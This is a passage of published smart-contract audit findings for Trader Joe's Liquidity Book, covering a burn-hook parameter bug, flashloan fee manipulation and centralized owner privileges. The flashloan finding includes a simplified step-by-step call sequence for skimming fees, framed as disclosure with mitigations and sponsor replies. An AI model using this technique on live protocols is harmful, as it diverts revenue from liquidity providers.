class=\"mtk1\"> </span><span class=\"mtk12\">_from</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_id</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\">(</span><span class=\"mtk12\">LBToken</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_from</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk3\">// Mint Logic</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t} </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_to</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk3\">// Burn Logic</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Such an extension would break, which could lead to loss of funds or a bricked system.</p>\n<h3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Call the hook correctly:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_beforeTokenTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_account</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/108\">0x0Louis (Trader Joe) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/108#issuecomment-1312200836\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden has shown how, due to a typo / programming mistake, the hook for burning tokens is called with incorrect parameters.</p>\n<p>Because of the caller being the pair, this ends up having reduced impact.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-03-flashloan-fee-collection-mechanism-can-be-easily-manipulated\" style=\"position:relative;\"><a href=\"#m-03-flashloan-fee-collection-mechanism-can-be-easily-manipulated\" aria-label=\"m 03 flashloan fee collection mechanism can be easily manipulated permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/136\">[M-03] Flashloan fee collection mechanism can be easily manipulated</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/136\">shung</a>, also found by <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/489\">philogy</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/419\">Trust</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/302\">parashar</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/173\">0x52</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/126\">rvierdiiev</a>, and <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/82\">KingNFT</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L415-L456\"><code>LBPair.flashLoan()</code></a> utilizes an “unfair” fee mechanism in which the whole pair liquidity can be loaned but only the liquidity providers of the active bin receive the fees. Although one can argue that this unfair structure is to incentivize greater liquidity around the active price range, it nonetheless opens up a way to easily manipulate fees. The current structure allows a user to provide liquidity to an active bin right before a flashloan to receive most of the fees. This trick can be used both by the borrower themselves, or by a third party miner or a node operator frontrunning the flashloan transactions. In either case, this is in detriment to the liquidity providers, who would be providing the bulk of the flashloan, but receiving a much less fraction of the fees.</p>\n<h3 id=\"proof-of-concept-7\" style=\"position:relative;\"><a href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><code>LBPair.flashLoan()</code> function <a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L435-L436\">enables borrowing the entire balance of a pair</a>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">tokenX</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amountXOut</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">tokenY</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amountYOut</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>This means that a liquidity provider’s tokens can be used regardless of which bin their liquidity is in. However, the loan fee <a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L452-L453\">is only paid to the active bin’s liquidity providers</a>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_bins</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">].</span><span class=\"mtk12\">accTokenXPerShare</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">_feesX</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getTokenPerShare</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_totalSupply</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_bins</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">].</span><span class=\"mtk12\">accTokenYPerShare</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">_feesY</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getTokenPerShare</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_totalSupply</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Based on this, someone can frontrun a flashloan by adding liquidity to the active bin to receive the most of the flashloan fees, even if the active bin constitutes a small percentage of the loaned amount. Alternatively, a borrower can also atomically add and remove liquidity to the active bin before and after the flashloan, respectively. This way the borrower essentially would be using flashloans with fraction of the intended fee.</p>\n<h4 id=\"example-scenario\" style=\"position:relative;\"><a href=\"#example-scenario\" aria-label=\"example scenario permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Example Scenario</h4>\n<p>Imagine a highly volatile market, in which the liquidity providers lag behind the price action, resulting in active bin to constitute a very small percent of the liquidity.  The following snippet shows the liquidity in each bin of the eleven bins of this imaginary market. The active bin, marked with an in-line comment, has 1 token X and 1 token Y in its reserves. You can appreciate that such a liquidity composition is highly probable when the price of the asset increases rapidly, leaving the concentrated liquidity behind. Even when this type of a distribution is not readily available, the price can be manipulated to create a similar distribution allowing the profitable execution of the described trick to steal flashloan fees.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"38\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t[ </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t[ </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">30</span><span class=\"mtk1\"> ],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t[ </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">40</span><span class=\"mtk1\"> ],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t[ </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">90</span><span class=\"mtk1\"> ],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t[ </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">80</span><span class=\"mtk1\"> ],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t[ </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">50</span><span class=\"mtk1\"> ],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t[ </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">30</span><span class=\"mtk1\"> ],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t[ </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t[ </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,  </span><span class=\"mtk7\">9</span><span class=\"mtk1\"> ],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t[ </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,  </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> ], </span><span class=\"mtk3\">// Active bin</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t[ </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,  </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> ]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">]</span></span></span></code></pre>\n<p>Here, a flashloan user can do the following transactions atomically (note: function arguments are simplified to portray the idea):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"39\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">LBRouter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addLiquidity</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">binId:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ACTIVE_BIN</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">tokenXAmount:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">9</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">tokenYAmount:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">9</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }); </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">LBPair</span><span class=\"mtk1\">.</span><span class=\"mtk11\">flashLoan</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">tokenXAmount:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">359</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">tokenYAmount:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">LBRouter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">removeLiquidity</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">binId:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ACTIVE_BIN</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">tokenXAmount:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">9</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">tokenYAmount:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">9</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }); </span></span></span></code></pre>\n<p>With this method, the borrower will receive 90% of the liquidity provider fees of the flashloan, even though they only had 2.5% of the token X liquidity. This method is very likely to cause majority of the flashloan fees leaking out of the protocol, denying liquidity providers their revenue. Even if the average flashloan borrower does not utilize this strategy to reduce the effective fee they pay, the trick would surely be used by MEV users sandwiching the flashloan transactions to receive the majority of the fees.</p>\n<h3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The ideal remediation would be to have a separate global fee structure for a given pair, and record token X and token Y fees per share separately. So if user A has only token X, they should only receive fee when token X is loaned, and not when token Y is loaned. But user A should receive their fee regardless of which bin their liquidity is in. However, given that users’ token reserves change dynamically, there appears to be no simple way of achieving this.</p>\n<p>If the ideal remediation cannot be achieved, a compromise would be to distribute the flashloan fees from the -nth populated bin to the +nth populated bin, where <code>n</code> is respective to the active bin. <code>n</code> could be an adjustable market parameter. A higher value of <code>n</code> would make the flashloan gas cost higher, but it would reduce the feasibility of the issues described in this finding. Admittedly, this is not a perfect solution: As long as an incomplete subset of liquidity providers or bins receive the flashloan fees, there will be bias hence a risk of inequitable or exploitable fee distribution.</p>\n<p>If the compromise is not deemed sufficient, the alternative would be to remove the flashloan feature from the protocol altogether. If the liquidity providers cannot equitably receive their flashloan fees, it might not worth to expose them to the risks of flashloans.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/136#issuecomment-1297273480\">0x0Louis (Trader Joe) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>We acknowledge this issue as we want to keep the flash loan, but giving fees to the nth bins would make the function too expensive to use. As our goal is to concentrate the liquidity in the active bin, this behavior is fine for us.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/136#issuecomment-1312780046\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Per the discussion above, the Warden has shown how, LPs that are not in active positions will not receive fees for the liquidity they supplied.</p>\n<p>The sponsor acknowledges.</p>\n<p>Because the finding demonstrates loss of yield for LPs (inactive liquidity can be used, but will receive no fees), I believe Medium Severity to be appropriate.</p>\n<p>The other side of the coin for this feature is that it does incentivize keeping liquidity in an active bin, which does help with capital efficiency, however, at this time, we cannot speculate about the usage of the protocol and per the above some LP risk not receiving fees.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-04-very-critical-owner-privileges-can-cause-complete-destruction-of-the-project-in-a-possible-privatekey-exploit\" style=\"position:relative;\"><a href=\"#m-04-very-critical-owner-privileges-can-cause-complete-destruction-of-the-project-in-a-possible-privatekey-exploit\" aria-label=\"m 04 very critical owner privileges can cause complete destruction of the project in a possible privatekey exploit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/139\">[M-04] Very critical <code>Owner</code> privileges can cause complete destruction of the project in a possible privateKey exploit</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/139\">0xSmartContract</a>, also found by <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/517\">csanuragjain</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/516\">djxploit</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/515\">hansfriese</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/512\">Josiah</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/511\">leosathya</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/510\">M4TZ1P</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/507\">sorrynotsorry</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/506\">wagmi</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/505\">zzykxx</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/501\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/435\">chaduke</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/399\">SooYa</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/377\">Mukund</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/344\">pashov</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/338\">Dravee</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/149\">catchup</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/119\">rvierdiiev</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/91\">Nyx</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/78\">vv7</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/56\">cccz</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/25\">ladboy233</a>, and <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/3\">supernova</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/libraries/PendingOwnable.sol#L42\">PendingOwnable.sol#L42</a><br></p>\n<p>Typically, the contract’s owner is the account that deploys the contract. As a result, the owner is able to perform certain privileged activities.</p>\n<p>However, Owner privileges are numerous and there is no timelock structure in the process of using these privileges.\nThe Owner is assumed to be an EOA, since the documents do not provide information on whether the Owner will be a multisign structure.</p>\n<p>In parallel with the private key thefts of the project owners, which have increased recently, this vulnerability has been stated as medium.</p>\n<p>Similar vulnerability;<br>\nPrivate keys stolen:</p>\n<p>Hackers have stolen cryptocurrency worth around <code>€552</code> million from a blockchain project linked to the popular online game Axie Infinity, in one of the largest cryptocurrency heists on record. Security issue : PrivateKey of the project officer was stolen:\n<a href=\"https://www.euronews.com/next/2022/03/30/blockchain-network-ronin-hit-by-552-million-crypto-heist\">https://www.euronews.com/next/2022/03/30/blockchain-network-ronin-hit-by-552-million-crypto-heist</a></p>\n<h3 id=\"proof-of-concept-8\" style=\"position:relative;\"><a href=\"#proof-of-concept-8\" aria-label=\"proof of concept 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><code>onlyOwner</code> powers;</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"40\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">14</span><span class=\"mtk1\"> </span><span class=\"mtk12\">results</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">2</span><span class=\"mtk1\"> </span><span class=\"mtk12\">files</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LBFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">220</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setLBPairImplementation</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_LBPairImplementation</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">322</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setLBPairIgnored</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">355</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setPreset</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">401</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">removePreset</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_binStep</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">439</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span 